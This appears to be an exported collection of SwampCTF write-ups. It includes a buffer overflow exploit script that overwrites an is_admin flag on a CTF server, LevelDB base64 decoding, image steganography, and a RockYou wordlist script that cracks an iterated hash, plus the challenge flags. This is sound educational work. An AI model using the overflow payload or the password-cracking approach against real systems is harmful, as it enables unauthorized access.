serves as an introduction to pwn that new ctfers can use to grasp basic pwn concepts.\nnc chals.swampctf.com 40004\nIt also had a download link to a ‘is_admin’ file and a ‘main.c’ file.\n(main.c file)\n#include &lt;stdio.h&gt;\n\n#include &lt;stdint.h&gt;\n\n#include &lt;stdbool.h&gt;\n\n  \n\nint print_stack(uint8_t *stack, uint32_t size){\n\n    printf(&quot;--- Print Stack ---\\n&quot;);\n\n  \n\n    while(size !=  -1) {\n\n        printf(&quot;0x%02x (%c)&quot;, stack[size], stack[size]);\n\n        if(size &lt;= 9) {\n\n            printf(&quot; = username[%d]\\n&quot;, size);\n\n        } else if(size &gt; 9 &amp;&amp; size &lt;= 13) {\n\n            printf(&quot; = is_admin[%d]\\n&quot;, size - 10);\n\n        } else {\n\n            printf(&quot;\\n&quot;);\n\n        }\n\n        size -= 1;\n\n    }\n\n    printf(&quot;--- End Print ---\\n&quot;);\n\n}\n\n  \n\nvoid print_flag(){\n\n    FILE *fptr;\n\n    char flag[35] = {0};\n\n  \n\n    fptr = fopen(&quot;flag.txt&quot;, &quot;r&quot;);\n\n    fread(flag, 1, 34, fptr);\n\n    printf(&quot;Here is your flag! %s\\n&quot;, flag);\n\n    fclose(fptr);\n\n}\n\n  \n\nint main(void) {\n\n  \n\n    bool is_admin = false;\n\n    char username[10] = &quot;XXXXXXXXXX&quot;; // prefill buffer with X&#039;s\n\n    char choice[2];\n\n    printf(&quot;At it&#039;s most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior. In this program, we demonstrate how buffer overflows can corrupt local variables.\\n\\n&quot;);\n\n    printf(&quot;To log into this system, please enter your name: &quot;);\n\n  \n\n    scanf(&quot;%s&quot;, username);\n\n    print_stack(&amp;username, 13);\n\n    printf(&quot;Hello, %s!\\n&quot;, username);\n\n  \n\n    if(is_admin == true) {\n\n        printf(&quot;%s is admin\\n&quot;, username);\n\n        printf(&quot;Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolean. And because in C, any Boolean value that isn&#039;t 0 is considered \\&quot;True\\&quot;, it lets you through!\\n&quot;);\n\n    } else {\n\n        printf(&quot;%s is not admin\\n&quot;, username);\n\n    }\n\n    printf(&quot;Do you want to print the flag? (y/n) &quot;);\n\n    scanf(&quot;%1s&quot;, choice);\n\n    if(choice[0] == &#039;y&#039;) {\n\n        if(is_admin == false) {\n\n            printf(&quot;You do not have the necessary access!\\n&quot;);\n\n            return 0;\n\n        }\n\n        print_flag();\n\n    }\n\n    printf(&quot;Exiting!\\n&quot;);\n\n    return 0;\n\n}\n\n(Didn’t include the ‘is_admin’ file because I found it unnecessary when finding my solution, it is more useful when learning how to actually solve a pwn challenge)\nSolution\nAfter looking through the main.c file, it was quite obvious that you have take advantage of buffer overflow in order to set yourself as the admin.\nIn this case after reading the code, you can clearly see where ```\nbool is_admin = false;\nchar username[10] = &quot;XXXXXXXXXX&quot;;\n\nNote, you can also check the is_admin file with an interactive disassembler to see the following\nv6 = 0;\n  strcpy(v5, &quot;XXXXXXXXXX&quot;);\n  printf(\n    &quot;At it&#039;s most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior&quot;\n    &quot;. In this program, we demonstrate how buffer overflows can corrupt local variables.\\n&quot;\n    &quot;\\n&quot;);\n  printf(&quot;To log into this system, please enter your name: &quot;);\n  __isoc99_scanf(&quot;%s&quot;, v5);\n  print_stack(v5, 13LL);\n  printf(&quot;Hello, %s!\\n&quot;, v5);\n  if ( (v5[10] &amp; 1) == 1 )\n  {\n    printf(&quot;%s is admin\\n&quot;, v5);\n    printf(\n      &quot;Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolea&quot;\n      &quot;n. And because in C, any Boolean value that isn&#039;t 0 is considered \\&quot;True\\&quot;, it lets you through!\\n&quot;);\n  }\n\nAnd in the stack of main you can see:\n-000000000000000F     _BYTE var_F[11];\n-0000000000000004     _DWORD var_4;\n\nWhich corresponds to v5 and v6 (username and is_admin)\nAnd whether or not you read the is_admin file or not, it was clear that you needed to use a payload to fill username and an extra byte to set is_admin\nI did this by creating a simple program that connected to the specific port (40004), and inputted the payload AAAAAAAAAA\\x01 as shown below:\n\nimport socket\n\n  \n\nhost = &quot;chals.swampctf.com&quot;\n\nport = 40004\n\n  \n\n# 10 A&#039;s to fill username + 1 byte (0x01) to set is_admin\n\npayload = b&quot;A&quot; * 10 + b&quot;\\x01&quot;\n\n  \n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n\n    s.connect((host, port))\n\n    # Read initial prompt\n\n    print(s.recv(1024).decode())\n\n  \n\n    # Send exploit payload\n\n    s.sendall(payload + b&quot;\\n&quot;)\n\n    # Read response (should confirm we are admin)\n\n    print(s.recv(1024).decode())\n\n  \n\n    # Send &#039;y&#039; to print the flag\n\n    s.sendall(b&quot;y\\n&quot;)\n\n  \n\n    # Read final response (should contain flag)\n\n    print(s.recv(1024).decode())\n\nFlag\nAfter running this program, it gave the output with the correct flag:\nswampCTF{n0t_@11_5t@ck5_gr0w_d0wn}"},"WRITEUPS/SwampCTF/Join-our-Discord":{"slug":"WRITEUPS/SwampCTF/Join-our-Discord","filePath":"WRITEUPS/SwampCTF/Join our Discord.md","title":"Join our Discord","links":[],"tags":[],"content":"Description\nJoin our Discord\nMisc\nWorth 25 Points\n\ndiscord.gg/9H6HbcMk7X\nSolution\nAfter reading the challenge description I decided to follow the link to see where it went. It led me to the SwampCTF discord where I was able to find a message from Cole:\n\nFlag\nWith that message, I was able to get the correct flag:\nswampCTF{w3lc0m3_t0_th3_swamp}"},"WRITEUPS/SwampCTF/Planetary-Storage":{"slug":"WRITEUPS/SwampCTF/Planetary-Storage","filePath":"WRITEUPS/SwampCTF/Planetary Storage.md","title":"Planetary Storage","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nPlanetary Storage\nForensics\nWorth 200 Points\n\nMy friend found this strange file while perusing his computer, but we can’t read it. Can you figure out what it is and get the information from it?\nDifficulty: Easy/Medium\nThe flag is in the standard format\nIt also had a download link to a ‘PlanetaryStorage.zip’ file which contained:\n\nSolution\nAfter searching through each file, I found that CURRENT, CURRENT.bak, LOCK, MANIFEST-000012 contained nothing of interest; LOG contained a little bit of data on the .ldb files, but not much of interest still; while the .ldb files contained a lot of information.\nStarting in 000002.ldb, I found a base64 string called the payload:\n&quot;payload&quot;:&quot;eyJrZXkiOiJcIjdiZjFjNTRlLTA5MjAtNGU2Zi1iNTBiLTE0ZDgzODY3NDdmN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYklsUm9hWE1pTENKcGN5SXNJbUVpTENKeVpXUWlMQ0pvWlhKeWFXNW5JU0pkTENKcFpDSTZJbHdpTjJKbU1XTTFOR1V0TURreU1DMDBaVFptTFdJMU1HSXRNVFJrT0RNNE5qYzBOMlkzWENJaWZRPT0ifQ==&quot;\n\nwhich when decrypted gave another base64 string:\n{&quot;key&quot;:&quot;\\&quot;7bf1c54e-0920-4e6f-b50b-14d8386747f7\\&quot;&quot;,&quot;op&quot;:&quot;PUT&quot;,&quot;value&quot;:&quot;eyJkYXRhIjpbIlRoaXMiLCJpcyIsImEiLCJyZWQiLCJoZXJyaW5nISJdLCJpZCI6IlwiN2JmMWM1NGUtMDkyMC00ZTZmLWI1MGItMTRkODM4Njc0N2Y3XCIifQ==&quot;}\n\nAnd when you decrypt that you get:\n{&quot;data&quot;:[&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;red&quot;,&quot;herring!&quot;],&quot;id&quot;:&quot;\\&quot;7bf1c54e-0920-4e6f-b50b-14d8386747f7\\&quot;&quot;}\n\nSo I went on and starting digging into the 000007.ldb file and found another base64 string called the payload:\neyJrZXkiOiJcIjNhNDdiYmZiLTgyMmMtNDU1Mi04N2VjLTUyNTA4ZDk0OGJkOFwiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYklsUm9hWE1pTENKcGN5SXNJbUVpTENKeVpXUWlMQ0pvWlhKeWFXNW5JU0pkTENKcFpDSTZJbHdpTTJFME4ySmlabUl0T0RJeVl5MDBOVFV5TFRnM1pXTXROVEkxTURoa09UUTRZbVE0WENJaWZRPT0ifQ==\n\nwhich gave another base64 string, which when decrypted gave:\n{&quot;data&quot;:[&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;red&quot;,&quot;herring!&quot;],&quot;id&quot;:&quot;\\&quot;3a47bbfb-822c-4552-87ec-52508d948bd8\\&quot;&quot;}\n\nSo I went on and started digging into the 000010.lbd file hoping that there wasn’t just another red herring. Then I yet another base64 string called the payload:\neyJrZXkiOiJcIjMzNTc5M2Q1LTRhYzEtNDgyMy05MmM3LWZkM2I1YTZhMmEwN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYkluTjNZVzF3UTFSR2V6RndaalV0WWpRMU0yUXRaRFEzTkdJME5UTjlJbDBzSW1sa0lqb2lYQ0l6TXpVM09UTmtOUzAwWVdNeExUUTRNak10T1RKak55MW1aRE5pTldFMllUSmhNRGRjSWlKOSJ9\n\nwhich gave another base64 string when decrypted:\n{&quot;key&quot;:&quot;\\&quot;335793d5-4ac1-4823-92c7-fd3b5a6a2a07\\&quot;&quot;,&quot;op&quot;:&quot;PUT&quot;,&quot;value&quot;:&quot;eyJkYXRhIjpbInN3YW1wQ1RGezFwZjUtYjQ1M2QtZDQ3NGI0NTN9Il0sImlkIjoiXCIzMzU3OTNkNS00YWMxLTQ4MjMtOTJjNy1mZDNiNWE2YTJhMDdcIiJ9&quot;}\n\nAnd when I decrypted that I got:\n{&quot;data&quot;:[&quot;swampCTF{1pf5-b453d-d474b453}&quot;],&quot;id&quot;:&quot;\\&quot;335793d5-4ac1-4823-92c7-fd3b5a6a2a07\\&quot;&quot;}\n\nwhich finally wasn’t a red herring\nFlag\nSo using the only non-red herring, I got the correct flag:\nswampCTF{1pf5-b453d-d474b453}"},"WRITEUPS/SwampCTF/Pretty-Picture-Double-Exposure":{"slug":"WRITEUPS/SwampCTF/Pretty-Picture-Double-Exposure","filePath":"WRITEUPS/SwampCTF/Pretty Picture Double Exposure.md","title":"Pretty Picture Double Exposure","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nPretty Picture: Double Exposure\nMisc\nWorth 25 points\n\nHidden in the bits below, an image wait’s to be shown.\nAnd it has a link to download this photo:\n\nSolution\nBased on the challenge description, I knew there had to be some sort of hidden data in the photo to do with Exposure, so I plugged the photo into www.aperisolve.com/  and was able to get a superimposed version of the photo:\n\nFlag\nAfter reading the superimposed version, I was able to get the correct flag:\nswampCTF{m3ss4g3s_0r_c0de_c4n_b3_h1dd3n_1n_1m4g3s}"},"WRITEUPS/SwampCTF/Rock-my-Password":{"slug":"WRITEUPS/SwampCTF/Rock-my-Password","filePath":"WRITEUPS/SwampCTF/Rock my Password.md","title":"Rock my Password","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/Hashing"],"tags":[],"content":"Cryptography Hashing\nDescription\nRock my Password\nCryptography\nWorth 150 Points\n\nI’ve come up with an extremely secure(tm) way to store my password, noone will be able to reverse it! I’ve hashed it with md5 100 times, then sha256 100 times, then sha512 100 times! There’s no way you’re going to be able to undo it &gt;:3 I’ll even tell you it was in the RockYou database, and the password is 10 characters long, that’s how confident I am!\nThe flag is in the format: swampCTF{RockYouPassword}\nAs a reminder, please don’t flood our infrastructure with guesses.\nHashed Password (Flag): f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc\nNote: The entire flag (swampCTF{rockyoupassword}) was hashed to get the provided hash, not just rockyoupassword\nSolution\nAfter first looking at this challenge, I tried to come up with some way to brute force the hashed password, but quickly realized that it would take a near infinite amount of time.\nSo, one of my teammates Jacky came up with the idea to instead, hash every 10 character password in the RockYou database through md5 100 times, sha256 100 times, then sha512 100 times and compare it against the already hashed password. In his words ‘cause hashing forward is really fast’.\nSo I implemented it just like that. I created a program that went through every 10 character password in the RockYou data base, hash it 300 times, and compare it to the target hash as shown below:\nimport hashlib\n\n  \n\n# Function to hash a given string 100 times with MD5, then SHA-256, then SHA-512\n\ndef custom_hash(password):\n\n    hashed = password.encode()\n\n  \n\n    # MD5 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.md5(hashed).digest()\n\n  \n\n    # SHA-256 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.sha256(hashed).digest()\n\n  \n\n    # SHA-512 x 100\n\n    for _ in range(100):\n\n        hashed = hashlib.sha512(hashed).digest()\n\n  \n\n    return hashed.hex()\n\n  \n\n# Given hash to match\n\ntarget_hash = &quot;f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc&quot;\n\n  \n\n# Path to RockYou wordlist (update if needed)\n\nrockyou_path = &quot;C:/Documents/SWAMPCTF/rockyou (1).txt&quot;\n\n  \n\n# Read the RockYou file and process only 10-character passwords\n\nwith open(rockyou_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f:\n\n    for password in f:\n\n        password = password.strip()\n\n        if len(password) == 10:  # Only check 10-character passwords\n\n            formatted_password = f&quot;swampCTF{{{password}}}&quot;  # Wrap in flag format\n\n            if custom_hash(formatted_password) == target_hash:\n\n                print(f&quot;FOUND FLAG: swampCTF{{{password}}}&quot;)\n\n                break\n\nFlag\nAfter running the above program, it output the correct flag:\nswampCTF{secretcode}"},"index":{"slug":"index","filePath":"index.md","title":"Welcome to Prof-Starsky's CTF Write-up Digital Garden","links":["WRITEUPS"],"tags":[],"content":"This is my collection of my CTF writeups\n\n\nWriteups - Detailed writeups for various projects and challenges.\n\n"}}